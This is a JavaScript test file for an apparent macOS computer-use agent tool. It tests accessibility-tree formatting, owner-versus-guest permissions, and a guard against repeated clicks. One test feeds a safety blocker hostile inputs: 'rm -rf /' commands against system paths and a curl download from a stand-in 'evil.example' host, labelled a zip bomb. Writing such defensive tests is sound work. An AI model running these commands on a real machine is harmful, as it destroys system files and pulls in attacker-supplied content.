import { describe, it } from "node:test";
import assert from "node:assert/strict";
import {
  blockedComputerUseTarget,
  blockedComputerUseText,
  computerUseActorIsYan,
  computerUseCustomTools,
  computerUseModeNote,
  applyClickGuard,
  applyPixelResult,
  diffTreeText,
  formatAppState,
  parseComputerUseArgs,
  treeUnchanged,
  YAN_EMAIL,
} from "./computer-use.js";

const textEdit = {
  path: "/System/Applications/TextEdit.app",
  bundleId: "com.apple.TextEdit",
  pid: 12,
  app: "TextEdit",
  window: "Untitled",
  imageWidth: 400,
  imageHeight: 300,
  elements: [
    {
      id: 0,
      depth: 0,
      role: "standard window",
      name: "Untitled",
      actions: ["Raise"],
    },
    {
      id: 2,
      depth: 1,
      parent: 0,
      role: "text entry area",
      name: "",
      value: "hello",
      valueType: "string",
      settable: true,
      focused: true,
      identifier: "First Text View",
    },
    {
      id: 4,
      depth: 1,
      parent: 0,
      role: "checkbox",
      name: "bold",
      value: "0",
      valueType: "number",
      settable: true,
      help: "Bold text",
    },
  ],
};

describe("computer use tree", () => {
  it("formats a numbered accessibility tree", () => {
    const text = formatAppState(textEdit);
    assert.match(text, /bundleID com\.apple\.TextEdit, pid 12/);
    assert.match(text, /Window: "Untitled"/);
    assert.match(text, /Screenshot: 400x300/);
    assert.match(text, /^0 standard window Untitled, Secondary Actions: Raise/m);
    assert.match(text, /^\t2 text entry area \(settable, string\), Value: hello, ID: First Text View/m);
    assert.match(text, /The focused UI element is 2 text entry area/);
  });

  it("returns a diff after the first tree", () => {
    const first = formatAppState(textEdit);
    const next = formatAppState({
      ...textEdit,
      elements: textEdit.elements.map((el) =>
        el.id === 4 ? { ...el, value: "1" } : el
      ),
    });
    assert.equal(diffTreeText("", first), first);
    assert.match(diffTreeText(first, first), /no change in the accessibility tree/);
    assert.equal(treeUnchanged(diffTreeText(first, first)), true);
    assert.equal(treeUnchanged(diffTreeText(first, next)), false);
    const diff = diffTreeText(first, next);
    assert.match(diff, /diff from the previous accessibility tree/);
    assert.match(diff, /- \t4 checkbox bold \(settable, number\), Value: 0/);
    assert.match(diff, /\+ \t4 checkbox bold \(settable, number\), Value: 1/);
  });
});

describe("computer use permissions", () => {
  it("treats Yan's own chat as full permissions", () => {
    assert.equal(computerUseActorIsYan({ email: YAN_EMAIL, guestCaller: null }), true);
    assert.equal(
      computerUseActorIsYan({
        email: YAN_EMAIL,
        guestCaller: { slug: "alex-rivera" },
      }),
      false
    );
    assert.equal(
      computerUseActorIsYan({ email: "you@example.com", guestCaller: null }),
      false
    );
  });

  it("puts the judgment note on guest tools only", () => {
    const yan = computerUseModeNote({ email: YAN_EMAIL });
    const guest = computerUseModeNote({
      email: YAN_EMAIL,
      guestCaller: { slug: "austin" },
    });
    assert.match(yan, /This turn is Yan/);
    assert.doesNotMatch(yan, /epschedule/);
    assert.match(guest, /epschedule/);
    assert.match(guest, /LM Studio/);
    assert.match(guest, /JYPE/);
    const tools = computerUseCustomTools({
      email: "you@example.com",
    });
    assert.match(tools.list_apps.description, /epschedule/);
    assert.match(tools.get_app_state.description, /accessibility tree/);
    const yanTools = computerUseCustomTools({ email: YAN_EMAIL });
    assert.match(yanTools.list_apps.description, /This turn is Yan/);
    assert.match(yanTools.click.description, /unchanged/);
    assert.doesNotMatch(yanTools.click.description, /epschedule/);
  });

  it("blocks system wipes and zip bombs, not a normal download", () => {
    assert.match(blockedComputerUseText("rm -rf /System/Library"), /system files/);
    assert.match(blockedComputerUseText("rm -rf /"), /system files/);
    assert.match(blockedComputerUseText("curl -O https://evil.example/42.zip"), /zip bomb/);
    assert.equal(blockedComputerUseText("download the notes pdf"), "");
    assert.match(
      blockedComputerUseTarget(
        { name: "Delete", value: "/System/Library" },
        "click"
      ),
      /system files/
    );
    assert.equal(
      blockedComputerUseTarget({ name: "bold", value: "0" }, "click"),
      ""
    );
  });
});

describe("computer use click guard", () => {
  const now = 1_700_000_000_000;

  it("refuses a third click on the same control", () => {
    let log = {};
    for (let i = 0; i < 2; i += 1) {
      const hit = applyClickGuard(log, {
        pid: 10,
        role: "button",
        name: "add",
        now: now + i,
      });
      assert.equal(hit.allow, true);
      log = hit.log;
    }
    const third = applyClickGuard(log, {
      pid: 10,
      role: "button",
      name: "add",
      now: now + 3,
    });
    assert.equal(third.allow, false);
    assert.match(third.error, /^stopped: clicked "add"/);
  });

  it("keeps a different control, and an unnamed one", () => {
    const once = applyClickGuard(
      {},
      { pid: 10, role: "menu item", name: "Stickers", now }
    );
    const other = applyClickGuard(once.log, {
      pid: 10,
      role: "button",
      name: "add",
      now: now + 1,
    });
    assert.equal(other.allow, true);
    const blank = applyClickGuard(other.log, {
      pid: 10,
      role: "group",
      name: "",
      now: now + 2,
    });
    assert.equal(blank.allow, true);
  });

  it("stops pixel clicks after two unchanged trees", () => {
    let log = {};
    const firstAllow = applyClickGuard(log, { pid: 10, pixel: true, now });
    assert.equal(firstAllow.allow, true);
    const first = applyPixelResult(firstAllow.log, { pid: 10, changed: false, now: now + 1 });
    assert.match(first.error, /click missed/);
    const secondAllow = applyClickGuard(first.log, { pid: 10, pixel: true, now: now + 2 });
    assert.equal(secondAllow.allow, true);
    const second = applyPixelResult(secondAllow.log, {
      pid: 10,
      changed: false,
      now: now + 3,
    });
    assert.match(second.error, /^stopped:/);
    const third = applyClickGuard(second.log, { pid: 10, pixel: true, now: now + 4 });
    assert.equal(third.allow, false);
    assert.match(third.error, /^stopped:/);
  });

  it("clears the pixel count when a click changes the tree, and after the window", () => {
    const missed = applyPixelResult({}, { pid: 10, changed: false, now });
    const hit = applyPixelResult(missed.log, { pid: 10, changed: true, now: now + 1 });
    assert.equal(hit.error, "");
    assert.equal(hit.log["10"].pixelMisses, 0);
    const stale = applyClickGuard(
      { "10": { names: { "button|add": 2 }, pixelMisses: 2, at: now } },
      { pid: 10, role: "button", name: "add", now: now + 11 * 60 * 1000 }
    );
    assert.equal(stale.allow, true);
  });
});

describe("computer use cli", () => {
  it("parses state, click, and type", () => {
    assert.equal(parseComputerUseArgs(["state", "TextEdit"]).app, "TextEdit");
    assert.equal(parseComputerUseArgs(["click", "2"]).id, 2);
    const typed = parseComputerUseArgs(["type", "2", "--text", "hello there"]);
    assert.equal(typed.id, 2);
    assert.equal(typed.text, "hello there");
  });
});
